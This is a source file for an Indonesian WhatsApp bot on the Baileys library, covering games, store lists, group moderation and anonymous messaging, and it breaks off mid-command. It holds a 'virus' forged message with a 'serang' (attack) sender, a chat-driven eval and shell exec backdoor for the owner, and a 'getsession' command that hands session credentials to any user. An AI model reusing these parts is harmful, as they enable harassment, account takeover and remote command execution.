/**
  * Created by Riy
  * Base Ori : Rtwone / Irfan
*/

"use strict";
const {
	downloadContentFromMessage
} = require("@adiwajshing/baileys")
const { color, bgcolor } = require('../lib/color')
const { generateProfilePicture, getBuffer, fetchJson, fetchText, getRandom, getGroupAdmins, bytesToSize, runtime, sleep, makeid } = require("../lib/myfunc");
const { webp2mp4File } = require("../lib/convert")
const { pinterest } = require("../lib/pinterest")
const { TelegraPh, UploadFileUgu } = require("../lib/uploader");
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("../lib/limit");
const { isTicTacToe, getPosTic } = require("../lib/tictactoe");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList, getPosiList} = require('../lib/respon-list');
const { addPlayGame, getJawabanGame, isPlayGame, cekWaktuGame, getGamePosi } = require("../lib/game");
const tictac = require("../lib/tictac");
const _prem = require("../lib/premium");
const fs = require ("fs");
const moment = require("moment-timezone");
const FormData = require("form-data");
const util = require("util");
const { exec, spawn } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const xfar = require('xfarr-api');
const axios = require("axios");
const hxz = require("hxz-api");
const ra = require("ra-api");
const kotz = require("kotz-api");
const yts = require("yt-search");
const speed = require("performance-now");
const request = require("request");
const ms = require("parse-ms");

// Exif
const Exif = require("../lib/exif")
const exif = new Exif()

// DB Game
let tictactoe = [];
let tebakgambar = []

// Database
let pendaftar = JSON.parse(fs.readFileSync('./database/user.json'))
let premium = JSON.parse(fs.readFileSync('./database/premium.json'));
let balance = JSON.parse(fs.readFileSync('./database/balance.json'));
let limit = JSON.parse(fs.readFileSync('./database/limit.json'));
let glimit = JSON.parse(fs.readFileSync('./database/glimit.json'));
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let antilink = JSON.parse(fs.readFileSync('./database/antilink.json'));
// Tanggal
var dt = new Date 
const date = dt.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' }) 

moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = async(conn, msg, m, setting, store, welcome) => {
	try {
		let { ownerNumber, botName, gamewaktu, limitCount, packname, author } = setting
		let { allmenu } = require('./help')
		let { bughole } = require('./bughole')
		const { type, quotedMsg, mentioned, now, fromMe } = msg
		if (msg.isBaileys) return
		const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
		let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const ucapanWaktu = "Selamat "+dt.charAt(0).toUpperCase() + dt.slice(1)
		const content = JSON.stringify(msg.message)
		const from = msg.key.remoteJid
		const chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
                const toJSON = j => JSON.stringify(j, null,'\t')
		if (conn.multi) {
			var prefix = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\^]/gi) : ''
		} else {
			if (conn.nopref) {
				prefix = ''
			} else {
				prefix = conn.prefa
			}
		}
		const args = chats.split(' ')
		const command = chats.toLowerCase().split(' ')[0] || ''
		const isCmd = command.startsWith(prefix)
		const isGroup = msg.key.remoteJid.endsWith('@g.us')
		const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
		const isOwner = ownerNumber == sender ? true : ["6281575886399@s.whatsapp.net", "6281575886399@s.whatsapp.net"].includes(sender) ? true : false
		const pushname = msg.pushName
		const q = chats.slice(command.length + 1, chats.length)
		const body = chats.startsWith(prefix) ? chats : ''
		const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'
		const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.id : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender)
		const isUser = pendaftar.includes(sender)
		const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
        const isWelcome = isGroup ? welcome.includes(from) ? true : false : false
        const isAntilink = isGroup ? antilink.includes(from) ? true : false : false
        const fdoc = { key : { participant : '0@s.whatsapp.net'}, message: { documentMessage: {title: setting.footext, jpegThumbnail: setting.thumb, thumbnailUrl: setting.group } } }
		const gcounti = setting.gcount
		const gcount = isPremium ? gcounti.prem : gcounti.user
        const ftoko = {key:{fromMe:false, participant:`0@s.whatsapp.net`, ...(from? {remoteJid:"0@s.whatsapp.net"}:{}) }, message:{ "productMessage":{ "product":{ "productImage":{ "mimetype":"image/jpeg", "jpegthumbnail": setting.pathimg }, "title": setting.footext, "description": ucapanWaktu, "currencyCode":"IDR", "priceAmount1000":"20000000", "retailerId":"Ghost", "productImageCount":1 }, "businessOwnerJid":`6281316702752@s.whatsapp.net` } } }
		const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
                const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
                const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
                mention != undefined ? mention.push(mentionByReply) : []
                const mentionUser = mention != undefined ? mention.filter(n => n) : []
                const virus =  {
             key: { fromMe: false,remoteJid: "fleyvin soft@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: global.thumb, surface: 200, message: '1955', orderTitle: 'hehe', sellerJid: '0@s.whatsapp.net'} } }       
     const serang = (nomore) => {
           conn.sendMessage(nomore, { text: nomore, contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(settimg.pathimg),"sourceUrl": "hehe"}}}, { quoted: virus})
           }
		const sendFileFromUrl = async (from, url, caption, options = {}) => {
		    let mime = '';
		    let res = await axios.head(url)
		    mime = res.headerd["content-type"]
		    let type = mime.split("/")[0]+"Message"
		    if (mime.split("/")[0] === "image") {
		       var img = await getBuffer(url)
		       return conn.sendMessage(from, { image: img, caption: caption }, options)
		    } else if (mime.split("/")[0] === "video") {
		       var vid = await getBuffer(url)
		       return conn.sendMessage(from, { video: vid, caption: caption }, options)
		    } else if (mime.split("/")[0] === "audio") {
		       var aud = await getBuffer(url)
		       return conn.sendMessage(from, { audio: aud, mimetype: 'audio/mp3' }, options)
		    } else {
		       var doc = await getBuffer(url)
		       return conn.sendMessage(from, { document: doc, mimetype: mime, caption: caption }, options)
		    }
		}
		async function hitungmundur(bulan, tanggal) { //By Fax Ngk Usah Di Ubah
          let from = new Date(`${bulan} ${tanggal}, 2023 00:00:00`).getTime();
          let now = Date.now();
          let distance = from - now;
          let days = Math.floor(distance / (1000 * 60 * 60 * 24));
          let hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
          let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
          let seconds = Math.floor((distance % (1000 * 60)) / 1000);
          return days + "Hari " + hours + "Jam " + minutes + "Menit " + seconds + "Detik"
         }    
        async function sendPlay(from, query) {
           var url = await yts(query)
           url = url.videos[0].url
           hxz.youtube(url).then(async(data) => {
             var button = [{ buttonId: `!ytmp3 ${url}`, buttonText: { displayText: `🎵 Audio (${data.size_mp3})` }, type: 1 }, { buttonId: `!ytmp4 ${url}`, buttonText: { displayText: `🎥 Video (${data.size})` }, type: 1 }]
             conn.sendMessage(from, { caption: `*Title :* ${data.title}\n*Quality :* ${data.quality}\n*Url :* https://youtu.be/${data.id}`, location: { jpegThumbnail: await getBuffer(data.thumb) }, buttons: button, footer: 'Pilih Salah Satu Button Dibawah⬇️', mentions: [sender] })
           }).catch((e) => {
             conn.sendMessage(from, { text: "Maaf terjadi kesalahan" }, { quoted: msg })
               ownerNumber.map( i => conn.sendMessage(from, { text: `Send Play Error : ${e}` }))
           })
        }
		const isUrl = (url) => {
			return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
		}
		const isEmoji = (emo) => {
                   let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
                   let regexEmoji = new RegExp(emoji_ranges, 'gi');
                   return emo.match(regexEmoji)
                }
		function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
		function monospace(string) {
            return '```' + string + '```'
        }
		function randomNomor(min, max = null) {
		  if (max !== null) {
			min = Math.ceil(min);
			max = Math.floor(max);
			return Math.floor(Math.random() * (max - min + 1)) + min;
		  } else {
			return Math.floor(Math.random() * min) + 1
		  }
		}
		const pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		}
		function mentions(teks, mems = [], id) {
			if (id == null || id == undefined || id == false) {
			  let res = conn.sendMessage(from, { text: teks, mentions: mems })
			  return res
			} else {
		      let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
		      return res
 		    }
		}
		function parseMention(text = '') {
                   return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
                }
		const reply = (teks) => {
			conn.sendMessage(from, { text: teks , contextInfo:{"externalAdReply": {"title": `Haik Onichan`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": { url : setting.pathimg },"sourceUrl": "hehe"}}}, { quoted: { key: {fromMe: false, participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { contactMessage: { displayName: jam + ' WIB', vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + `item1.TEL;waid=${sender.split("@")[0]}:+${sender.split("@")[0]}\n` + 'item1.X-ABLabel:Ponsel\n' + 'END:VCARD' }}} })
		}
		const textImg = (teks) => {
			return conn.sendMessage(from, { text: teks, jpegThumbnail: { url : setting.pathimg } }, { quoted: msg })
		}
		const sendMess = (hehe, teks) => {
			conn.sendMessage(hehe, { text, teks })
		}
		const buttonWithText = (from, text, footer, buttons) => {
			return conn.sendMessage(from, { text: text, footer: footer, templateButtons: buttons })
		}
		const sendContact = (jid, numbers, name, quoted, mn) => {
			let number = numbers.replace(/[^0-9]/g, '')
			const vcard = 'BEGIN:VCARD\n' 
			+ 'VERSION:3.0\n' 
			+ 'FN:' + name + '\n'
			+ 'ORG:;\n'
			+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
			+ 'END:VCARD'
			return conn.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: quoted })
		}
		const buttonsDefault = [
			{ urlButton: { displayText: `Group Ofc`, url : setting.medsos.group } },
			{ urlButton: { displayText: `Instagram`, url : setting.medsos.instagram } },
			{ quickReplyButton: { displayText: `🧑 Owner`, id: `${prefix}owner` } },
			{ quickReplyButton: { displayText: `💰 Donasi`, id: `${prefix}donate` } },
			{ quickReplyButton: { displayText: `🗒️ Dashboard`, id: `${prefix}dashboard` } }
		]
        
		const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedMsg = (type == 'extendedTextMessage')
		const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
		const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
		const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
		const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
		const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false

		// Auto Read & Presence Online
		conn.readMessages([msg.key])
		conn.sendPresenceUpdate('available', from)
		
		var hariRaya = new Date('6 5, 2023 00:00:00')
			var sekarang = new Date().getTime();
			var Selisih = hariRaya - sekarang;
			var jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			var jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			var mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			var ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			var ultah = `${jhari} Hari ${jjam} Jam ${mmmenit} Menit ${ddetik} Detik`

		// Auto Bio?
		if (new Date() * 1 ) {
		await conn.setStatus(`🎉 Ultah Owner : ${ultah} | ⏳ Runtime : ${runtime(process.uptime())} | 💬 Prefix : Multi`)
	    }
         
         if (isAntilink && isGroup) {
        if (body.match(`chat.whatsapp.com`)) {
        reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (isBotGroupAdmins) return reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+ await conn.groupInviteCode(from))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(body)
        if (isgclink) return reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isGroupAdmins) return reply(`Ehh maaf kamu admin`)
        if (isOwner) return reply(`Ehh maaf kamu owner bot ku`)
        await conn.groupParticipantsUpdate(from, [sender], 'remove')
        }
        }
        
		// Auto Registrasi
		if (isCmd && !isUser) {
		  pendaftar.push(sender)
		  reply(`Hai kak @${pushname}, Kamu Belum terdeteksi di database bot, ketik *.menu* untuk melihat list menu, Selamat Menggunakan ${botname}`)
		  fs.writeFileSync('./database/user.json', JSON.stringify(pendaftar, null, 2))
		}
		
		// Premium
		_prem.expiredCheck(conn, premium)

		// Tictactoe
		if (isTicTacToe(from, tictactoe)) tictac(chats, prefix, tictactoe, from, sender, reply, mentions, addBalance, balance)
		
      
         
        // Game
		cekWaktuGame(conn, tebakgambar)
		if (isPlayGame(from, tebakgambar) && isUser) {
		  if (chats.toLowerCase() == getJawabanGame(from, tebakgambar)) {
		    var htgm = randomNomor(100, 150)
			addBalance(sender, htgm, balance)
		    reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakgambar)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakgambar*`)
		    tebakgambar.splice(getGamePosi(from, tebakgambar), 1)
		  }
		}
		
		// Function for Count Hit
                async function addCountCmdUser(nama, sender, u) {
                   var posi = null
                   var pos = null
                   Object.keys(u).forEach((i) => {
                     if (u[i].jid === sender) {
                       posi = i
                     }
                   })
                   if (posi === null) {
                     u.push({jid: sender, db: [{nama: nama, count: 0}]})
                     fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
                     Object.keys(u).forEach((i) => {
                       if (u[i].jid === sender) {
                         posi = i
                       }
                     })
                   }
                   if (posi !== null) {
                     Object.keys(u[posi].db).forEach((i) => {
                       if (u[posi].db[i].nama === nama) {
                         pos = i
                       }
                     })
                     if (pos === null) {
                       u[posi].db.push({nama: nama, count: 1})
                       fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
                     } else {
                       u[posi].db[pos].count += 1
                       fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
                     }
                   }
                }
                async function getPosiCmdUser(sender, _db) {
                   var posi = null
                   Object.keys(_db).forEach((i) => {
                     if (_db[i].jid === sender) {
                       posi = i
                     }
                   })
                   return posi
                }
                async function addCountCmd(nama, sender, _db) {
                   addCountCmdUser(nama, sender, _cmdUser)
                   var posi = null
                   Object.keys(_db).forEach((i) => {
                     if (_db[i].nama === nama) {
                       posi = i
                     }
                   })
                   if (posi === null) {
                     _db.push({nama: nama, count: 1})
                     fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
                   } else {
                     _db[posi].count += 1
                     fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
                   }
                }

		      // For Response List in Group
                if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
                  var get_data_respon = getDataResponList(from, chats, db_respon_list)
                  if (get_data_respon.isImage === false) {
                    conn.sendMessage(from, { text: sendResponList(from, chats, db_respon_list) }, { quoted: msg })
                  } else {
                    conn.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, { quoted: msg })
                  }
                }

		if (chats.startsWith("> ") && isOwner) {
		console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
		  const ev = (sul) => {
            var sat = JSON.stringify(sul, null, 2)
            var bang = util.format(sat)
            if (sat == undefined) {
              bang = util.format(sul)
            }
            return textImg(bang)
          }
          try {
           textImg(util.format(eval(`;(async () => { ${chats.slice(2)} })()`)))
          } catch (e) {
           textImg(util.format(e))
          }
		} else if (chats.startsWith("$ ") && isOwner) {
        console.log(color('[EXEC]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
          exec(chats.slice(2), (err, stdout) => {
		    if (err) return reply(`${err}`)
		    if (stdout) reply(`${stdout}`)
		  })
        } else if (chats.startsWith("x ") && isOwner) {
	    console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkaokwoak`))
		 try {
	       let evaled = await eval(chats.slice(2))
		   if (typeof evaled !== 'string') evaled = require("util").inspect(evaled)
			reply(`${evaled}`)
		 } catch (err) {
		   reply(`${err}`)
		 }
		}
		
		// Logs;
		if (!isGroup && isCmd && !fromMe) {
			addBalance(sender, randomNomor(20), balance)
			console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
		}
		if (isGroup && isCmd && !fromMe) {
			addBalance(sender, randomNomor(20), balance)
			console.log('->[\x1b[1;32mCMD\x1b[1;37m]', color(moment(msg.messageTimestamp *1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
		}

		switch(command) {
			// Store Menu
            case prefix+'list':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
            if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini`)
            addCountCmd('#list', sender, _cmd)
            var arr_rows = [];
            for (let x of db_respon_list) {
                if (x.id === from) {
                    arr_rows.push({
                        title: x.key,
                        rowId: x.key
                    })
                }
            }
            var listMsg = {
                text: `${ucapanWaktu} @${sender.split("@")[0]}`,
                buttonText: 'Click Here!',
                footer: `*List ${groupName}*\n\n⏳ ${jam}\n📆 ${date}`,
                mentions: [sender],
                sections: [{
                    title: groupName, rows: arr_rows
                }]
            }
            conn.sendMessage(from, listMsg)
            break
         case prefix+'addlist':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
            if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
            addCountCmd('#addlist', sender, _cmd)
            if (isImage || isQuotedImage) {
                let media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender}`)
                const fd = new FormData();
                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
                fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: fd
                }).then(res => res.json())
                    .then((json) => {
                        addResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
                        reply(`Sukses set list message dengan key : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
                    })
            } else {
                addResponList(from, args1, args2, false, '-', db_respon_list)
                reply(`Sukses set list message dengan key : *${args1}*`)
            }
            break
        case prefix+'dellist':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
            if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
            if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
            addCountCmd('#dellist', sender, _cmd)
            delResponList(from, q, db_respon_list)
            reply(`Sukses delete list message dengan key *${q}*`)
            break
        case prefix+'update':
            if (!isGroup) return reply(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
            if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
            addCountCmd('#update', sender, _cmd)
            if (isImage || isQuotedImage) {
                let media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender}`)
                const fd = new FormData();
                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
                fetch('https://telegra.ph/upload', {
                    method: 'POST',
                    body: fd
                }).then(res => res.json())
                    .then((json) => {
                        updateResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
                        reply(`Sukses update list message dengan key : *${args1}*`)
                        if (fs.existsSync(media)) fs.unlinkSync(media)
                    })
            } else {
                updateResponList(from, args1, args2, false, '-', db_respon_list)
                reply(`Sukses update respon list dengan key *${args1}*`)
            }
            break
        case prefix+'proses':
            if (!isGroup) return
            if (!isOwner && !groupAdmins) return
            if (!quotedMsg) return reply('Reply Bukti Pembayaran!!')
            if (!q) return reply('Masukan Catatan Pelanggan\nContoh: proses 11 Diamond Ml | Id 12345678(1234)')
            addCountCmd('#proses', sender, _cmd)
            let proses = `「 *TRANSAKSI PENDING* 」\n\n\`\`\`📆 TANGGAL : ${date}\n⌚ JAM     : ${jam}\n✨ STATUS  : Pending\`\`\`\n\n📝 Catatan :\n${q}\n\nPesanan sedang di proses!`
            mentions(proses, true)
            msg.quoted.copyNForward(`${ownerNumber}`, true)
            conn.sendMessage(`${ownerNumber}`, {text: proses })
            break
        case prefix+'done':
            if (!isOwner) return
            if (args.length < 2) return reply(`Kirim perintah ${command} 62xxx|catatan`)
            if (!q.includes('|')) return reply(`Format salah, contoh pemakaian ${command} 62xxx|catatan`)
            addCountCmd('#done', sender, _cmd)
            var tek1 = q.split('|')[0]
            var tek2 = q.split('|')[1]
            let numbb = `${tek1}@s.whatsapp.net`             
            let sukses = `「 *TRANSAKSI BERHASIL* 」\n\n\`\`\`📆 TANGGAL : ${date}\n⌚ JAM     : ${jam}\n✨ STATUS  : Berhasil\`\`\`\n\n📝 Catatan :\n${tek2}\n\nTerimakasih @${numbb.split("@")[0]} Next Order ya🙏`
            conn.sendMessage(`${numbb}`, { text: sukses, mentions: [numbb] })
            break
         case prefix+'tambah':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command.slice(1)} *angka* *angka*\n\n_Contoh_\n\n${command.slice(1)} 1 2`)
            addCountCmd('#tambah', sender, _cmd)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one + nilai_two}`)
            break
        case prefix+'kurang':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command.slice(1)} *angka* *angka*\n\n_Contoh_\n\n${command.slice(1)} 1 2`)
            addCountCmd('#kurang', sender, _cmd)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one - nilai_two}`)
            break
        case prefix+'kali':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command.slice(1)} *angka* *angka*\n\n_Contoh_\n\n${command.slice(1)} 1 2`)
            addCountCmd('#kali', sender, _cmd)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one * nilai_two}`)
            break
        case prefix+'bagi':
            if (args.length < 3) return reply(`Gunakan dengan cara ${command.slice(1)} *angka* *angka*\n\n_Contoh_\n\n${command.slice(1)} 1 2`)
            addCountCmd('#bagi', sender, _cmd)
            var nilai_one = Number(args[1])
            var nilai_two = Number(args[2])
            reply(`${nilai_one / nilai_two}`)
            break
            // Main Menu
            case prefix+'test':
            let td = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
            var message = {
            document: { url: setting.pathimg },
            jpegThumbnail: { url : setting.pathimg }, fileName: setting.footext, mimetype: td, fileLength: '9999999', pageCount: '999',
            caption: "BOT ONLINE\n\nOKE DONE DESU",
            footer: setting.footext,
            templateButtons: buttonsDefault
        }
        conn.sendMessage(from, message)
           break
			case prefix+'menu':
			case prefix+'help':
			    addCountCmd('#help', sender, _cmd)
             var teks = allmenu(sender, prefix, pushname, isOwner, isPremium, balance, limit, limitCount, glimit, gcount)
             var thuju = { url : setting.pathimg }
			var tol = conn.send5ButLoc(from , teks, ` ${setting.footext}`, thuju, buttonsDefault, msg)
			await sleep(500)
			conn.sendMessage(from, { audio: { url: './media/yy.mp3' }, mimetype: 'audio/mp4', ptt: true}, { quoted : tol})
			break
			case prefix+'getsession':
			case prefix+'sendsession':
			var sesi = fs.readFileSync('session.json')
			conn.sendMessage(from, {document : sesi, mimetype: 'application/json', fileName: 'session.json' }, m)
				break
            case prefix+'menfess':
            case prefix+'kirim':
            addCountCmd('#menfess', sender, _cmd)
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (!q) return reply('penggunaan salah, contoh1 : .menfess nomor tujuan|nama pengirim|pesan kamu\ncontoh2: .menfess 6281316701742|satria|halo bg:v')
            var t1 = q.split("|")[0]
            var senderz = q.split("|")[1]
            var mess = q.split("|")[2]
            var tujuan = t1.replace(/[^@0-9]/g, '')+ "@s.whatsapp.net"
            conn.sendMessage(tujuan, {
				   image: fs.readFileSync('./media/menfess.jpeg'),
				   caption: `Pesan Dari ${senderz}\n\n*_TANGGAL_*: ${date}\n\n*_JAM_*     : ${jam}\n\n*_PESAN_* : ${mess}`,
				   buttons: [{buttonId: `${prefix}markread ${from}`, buttonText: { displayText: "Tandai Telah Di Baca" }, type: 1 }],
				   footer: ` ${setting.footext}`
			      }, { quoted: msg })
			reply(`sukses mengirim pesan ke ${tujuan}`)
            limitAdd(sender, limit)
            break
            case prefix+'markread':
            addCountCmd('#markread', sender, _cmd)
           conn.sendMessage(q, {
				   image: fs.readFileSync('./media/menfess.jpeg'),
				   caption: `${sender.split('@')[0]} Telah Membaca Pesan Mu\n\n*_TANGGAL_*: ${date}\n\n*_JAM_*: ${jam}`,
				   buttons: [{buttonId: `mmk`, buttonText: { displayText: "Ok" }, type: 1 }],
				   footer: ` ${setting.footext}`
			      }, { quoted: msg })
            break
			case prefix+'runtime':
			    addCountCmd('#runtime', sender, _cmd)
			    reply(runtime(process.uptime()))
			    break
			case prefix+'speed':
			    addCountCmd('#speed', sender, _cmd)
			    let timestamp = speed();
                            let latensi = speed() - timestamp
                            textImg(`${latensi.toFixed(4)} Second`)
		            break
			case prefix+'donate':
			case prefix+'donasi':
			    addCountCmd('#donasi', sender, _cmd)
